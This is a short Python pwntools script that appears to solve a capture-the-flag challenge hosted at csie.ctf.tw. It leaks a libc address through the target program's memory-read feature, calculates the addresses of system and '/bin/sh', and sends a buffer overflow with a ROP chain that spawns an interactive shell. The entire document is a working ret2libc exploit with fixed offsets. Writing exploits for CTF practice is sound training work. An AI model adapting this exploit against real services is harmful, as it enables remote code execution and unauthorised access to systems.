#!/usr/bin/env python
from pwn import *

mao = remote("csie.ctf.tw",10127)

pad = 56
libc_st_got = "0x601030"
libc_st_off = 0x20740
libc_sh_off = 0x18cd17
system_off = 0x45390
pop_rdi_ret = 0x400823

# The program will help us get the content in the address
# so I use the program to get got in libc_start_main

mao.sendline(libc_st_got)
mao.recvuntil("content:")
libc_st_adr = mao.recv()[0:14]
#print libc_st_adr
log.success("Get the address of libc start main")

libc_base = int(libc_st_adr,16) - libc_st_off
system_adr = libc_base + system_off
sh_adr = libc_base + libc_sh_off
log.success("Get the address of system and sh")

mao.sendline("A"*pad+p64(pop_rdi_ret)+p64(sh_adr)+p64(system_adr))
mao.interactive()

